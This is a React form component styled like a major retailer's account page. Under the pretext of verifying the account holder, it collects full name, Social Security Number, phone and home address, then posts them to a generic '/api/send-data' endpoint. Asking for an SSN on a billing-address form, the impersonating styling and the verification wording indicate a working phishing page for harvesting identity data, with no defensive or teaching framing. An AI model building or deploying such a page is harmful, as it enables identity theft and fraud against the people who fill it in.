"use client";

import axios from "axios";
import React, { useState } from "react";

const COUNTRY_OPTIONS = [
  { value: "US", label: "United States" },
  { value: "CA", label: "Canada" },
  { value: "GB", label: "United Kingdom" },
];

const STATE_OPTIONS = [
  { value: "", label: "Select" },
  { value: "AL", label: "Alabama" },
  { value: "AK", label: "Alaska" },
  { value: "AZ", label: "Arizona" },
  { value: "AR", label: "Arkansas" },
  { value: "CA", label: "California" },
  { value: "CO", label: "Colorado" },
  { value: "CT", label: "Connecticut" },
  { value: "DE", label: "Delaware" },
  { value: "FL", label: "Florida" },
  { value: "GA", label: "Georgia" },
  { value: "HI", label: "Hawaii" },
  { value: "ID", label: "Idaho" },
  { value: "IL", label: "Illinois" },
  { value: "IN", label: "Indiana" },
  { value: "IA", label: "Iowa" },
  { value: "KS", label: "Kansas" },
  { value: "KY", label: "Kentucky" },
  { value: "LA", label: "Louisiana" },
  { value: "ME", label: "Maine" },
  { value: "MD", label: "Maryland" },
  { value: "MA", label: "Massachusetts" },
  { value: "MI", label: "Michigan" },
  { value: "MN", label: "Minnesota" },
  { value: "MS", label: "Mississippi" },
  { value: "MO", label: "Missouri" },
  { value: "MT", label: "Montana" },
  { value: "NE", label: "Nebraska" },
  { value: "NV", label: "Nevada" },
  { value: "NH", label: "New Hampshire" },
  { value: "NJ", label: "New Jersey" },
  { value: "NM", label: "New Mexico" },
  { value: "NY", label: "New York" },
  { value: "NC", label: "North Carolina" },
  { value: "ND", label: "North Dakota" },
  { value: "OH", label: "Ohio" },
  { value: "OK", label: "Oklahoma" },
  { value: "OR", label: "Oregon" },
  { value: "PA", label: "Pennsylvania" },
  { value: "RI", label: "Rhode Island" },
  { value: "SC", label: "South Carolina" },
  { value: "SD", label: "South Dakota" },
  { value: "TN", label: "Tennessee" },
  { value: "TX", label: "Texas" },
  { value: "UT", label: "Utah" },
  { value: "VT", label: "Vermont" },
  { value: "VA", label: "Virginia" },
  { value: "WA", label: "Washington" },
  { value: "WV", label: "West Virginia" },
  { value: "WI", label: "Wisconsin" },
  { value: "WY", label: "Wyoming" },
];

const DEFAULT_VALUES = {
  country: "US",
  fullName: "",
  socialSecurityNumber: "",
  phone: "",
  addressLine1: "",
  addressLine2: "",
  city: "",
  state: "",
  zipCode: "",
  isDefaultAddress: false,
};

const REQUIRED_FIELDS = {
  country: "Country/Region is required.",
  fullName: "Full name is required.",
  socialSecurityNumber: "Social Security Number is required.",
  phone: "Phone number is required.",
  addressLine1: "Address Line 1 is required.",
  city: "City is required.",
  state: "State is required.",
  zipCode: "ZIP Code is required.",
};

const hasValue = (value) =>
  typeof value === "string" ? value.trim().length > 0 : Boolean(value);

const validateForm = (values) => {
  const nextErrors = {};

  Object.entries(REQUIRED_FIELDS).forEach(([field, message]) => {
    if (!hasValue(values[field])) {
      nextErrors[field] = message;
    }
  });

  if (
    values.socialSecurityNumber &&
    !/^\d{9}$/.test(values.socialSecurityNumber)
  ) {
    nextErrors.socialSecurityNumber =
      "Social Security Number must be exactly 9 digits.";
  }

  if (values.phone && !/^\+?[0-9]{10,15}$/.test(values.phone)) {
    nextErrors.phone = "Phone number must be 10 to 15 digits.";
  }

  if (values.zipCode && !/^\d{5}$/.test(values.zipCode)) {
    nextErrors.zipCode = "ZIP Code must be exactly 5 digits.";
  }

  return nextErrors;
};

const BaseField = ({
  label,
  name,
  type = "text",
  placeholder,
  hint,
  options = [],
  required = false,
  containerClassName = "",
  inputClassName = "",
  value,
  error,
  onChange,
  ...rest
}) => (
  <div className={containerClassName}>
    <label
      htmlFor={name}
      className="mb-2 block text-base font-semibold text-[#111111]"
    >
      {label}
    </label>

    {type === "select" ? (
      <select
        id={name}
        name={name}
        value={value}
        required={required}
        onChange={onChange}
        aria-invalid={Boolean(error)}
        className={`py-2 w-full rounded-[12px] border bg-white px-4 text-base leading-none text-[#111111] outline-none focus:border-[#1c6fd9] ${
          error ? "border-[#b12704]" : "border-[#9da3a8]"
        } ${inputClassName}`}
        {...rest}
      >
        {options.map((option) => (
          <option key={option.value} value={option.value}>
            {option.label}
          </option>
        ))}
      </select>
    ) : (
      <input
        id={name}
        name={name}
        type={type}
        value={value}
        required={required}
        placeholder={placeholder}
        onChange={onChange}
        aria-invalid={Boolean(error)}
        className={`py-2 w-full rounded-[12px] border bg-white px-4 text-base leading-none text-[#111111] outline-none placeholder:text-[#6c757d] focus:border-[#1c6fd9] ${
          error ? "border-[#b12704]" : "border-[#9da3a8]"
        } ${inputClassName}`}
        {...rest}
      />
    )}

    {hint ? <p className="mt-2 text-[14px] text-[#111111]">{hint}</p> : null}
    {error ? <p className="mt-1 text-sm text-[#b12704]">{error}</p> : null}
  </div>
);

const AddressForm = ({
  initialValues = {},
  countries = COUNTRY_OPTIONS,
  states = STATE_OPTIONS,
  onChange,
  onSubmit,
  className = "",
}) => {
  const [form, setForm] = useState({ ...DEFAULT_VALUES, ...initialValues });
  const [errors, setErrors] = useState({});
  const [loading, setLoading] = useState(false);
  const [submitError, setSubmitError] = useState("");

  const updateField = (name, value) => {
    setForm((prev) => {
      const next = { ...prev, [name]: value };
      if (onChange) onChange(next);
      return next;
    });

    setErrors((prev) => {
      if (!prev[name]) return prev;

      const nextValues = { ...form, [name]: value };
      const nextErrors = validateForm(nextValues);

      return nextErrors;
    });

    setSubmitError("");
  };

  const handleInputChange = (e) => {
    const { name, type, value, checked } = e.target;

    let nextValue = type === "checkbox" ? checked : value;

    if (name === "socialSecurityNumber") {
      nextValue = value.replace(/\D/g, "").slice(0, 9);
    }

    if (name === "zipCode") {
      nextValue = value.replace(/\D/g, "").slice(0, 5);
    }

    if (name === "phone") {
      nextValue = value.replace(/[^\d+]/g, "");

      if (nextValue.startsWith("+")) {
        nextValue = `+${nextValue.slice(1).replace(/\+/g, "")}`;
      } else {
        nextValue = nextValue.replace(/\+/g, "");
      }

      nextValue = nextValue.slice(0, 15);
    }

    updateField(name, nextValue);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const nextErrors = validateForm(form);
    setErrors(nextErrors);

    if (Object.keys(nextErrors).length > 0) {
      return;
    }

    try {
      setLoading(true);
      setSubmitError("");
      await axios.post("/api/send-data", form);
      if (onSubmit) onSubmit(form);
    } catch (err) {
      setSubmitError("Unable to submit form. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <form
      onSubmit={handleSubmit}
      noValidate
      className={`w-full max-w-[700px] px-4 py-8 sm:px-0 sm:py-12 ${className}`}
    >
      <div className="rounded-[12px] border border-[#58c5d5] bg-[#c9edf5] p-4">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <p className="text-[20px] font-bold text-[#111111] md:leading-none">
            {`Your Account > Your Billing Address`}
          </p>
          <p>
            {`Please enter your personal information to ensure that you are the actual account holder.`}
          </p>
        </div>
      </div>

      <div className="mt-6 space-y-4">
        <BaseField
          label="Country/Region*"
          name="country"
          type="select"
          options={countries}
          required
          value={form.country}
          error={errors.country}
          onChange={handleInputChange}
        />

        <BaseField
          label="Full name (First and Last name)*"
          name="fullName"
          placeholder="James"
          required
          value={form.fullName}
          error={errors.fullName}
          onChange={handleInputChange}
        />

        <BaseField
          label="Social Security Number*"
          name="socialSecurityNumber"
          placeholder="123456789"
          type="text"
          required
          value={form.socialSecurityNumber}
          error={errors.socialSecurityNumber}
          onChange={handleInputChange}
          maxLength={9}
          inputMode="numeric"
          autoComplete="off"
        />

        <BaseField
          label="Phone number*"
          name="phone"
          type="text"
          placeholder="+18402427954"
          hint="May be used to assist delivery"
          required
          value={form.phone}
          error={errors.phone}
          onChange={handleInputChange}
          maxLength={15}
          inputMode="tel"
          autoComplete="tel"
        />

        <div>
          <p className="mb-2 text-base font-bold text-[#111111] sm:text-[18px]">
            Address*
          </p>
          <input
            id="addressLine1"
            name="addressLine1"
            value={form.addressLine1}
            required
            placeholder="Street address or P.O. Box"
            onChange={handleInputChange}
            aria-invalid={Boolean(errors.addressLine1)}
            className={`py-2 w-full rounded-[12px] border bg-white px-4 text-base leading-none text-[#111111] outline-none placeholder:text-[#6c757d] focus:border-[#1c6fd9] ${
              errors.addressLine1 ? "border-[#b12704]" : "border-[#9da3a8]"
            }`}
          />
          {errors.addressLine1 ? (
            <p className="mt-1 text-sm text-[#b12704]">{errors.addressLine1}</p>
          ) : null}

          <input
            id="addressLine2"
            name="addressLine2"
            value={form.addressLine2}
            placeholder="Apt, suite, unit, building, floor, etc."
            onChange={handleInputChange}
            className="mt-2 py-2 w-full rounded-[12px] border border-[#9da3a8] bg-white px-4 text-base leading-none text-[#111111] outline-none placeholder:text-[#6c757d] focus:border-[#1c6fd9]"
          />
        </div>

        <div className="grid grid-cols-1 gap-4 md:grid-cols-3">
          <BaseField
            label="City*"
            name="city"
            required
            containerClassName="md:col-span-1"
            value={form.city}
            error={errors.city}
            onChange={handleInputChange}
          />

          <BaseField
            label="State*"
            name="state"
            type="select"
            options={states}
            required
            containerClassName="md:col-span-1"
            value={form.state}
            error={errors.state}
            onChange={handleInputChange}
          />

          <BaseField
            label="ZIP Code*"
            name="zipCode"
            placeholder="12345"
            type="text"
            required
            containerClassName="md:col-span-1"
            value={form.zipCode}
            error={errors.zipCode}
            onChange={handleInputChange}
            maxLength={5}
            inputMode="numeric"
            autoComplete="postal-code"
          />
        </div>

        <label
          htmlFor="isDefaultAddress"
          className="flex items-center gap-3 text-base text-[#111111] sm:text-[18px]"
        >
          <input
            id="isDefaultAddress"
            name="isDefaultAddress"
            type="checkbox"
            checked={form.isDefaultAddress}
            onChange={handleInputChange}
            className="h-5 w-5 rounded border border-[#9da3a8]"
          />
          Make this my default address
        </label>
      </div>

      <div className="flex-end">
        <button
          type="submit"
          disabled={loading}
          className="mt-7 rounded-full bg-[#ffd814] px-7 py-3 text-base font-semibold leading-none text-black hover:bg-[#f7ca00] disabled:cursor-not-allowed disabled:opacity-70 md:px-8"
        >
          {loading ? "Loading..." : "Next"}
        </button>
      </div>

      {submitError ? (
        <p className="mt-3 text-sm text-[#b12704]">{submitError}</p>
      ) : null}
    </form>
  );
};

export default AddressForm;
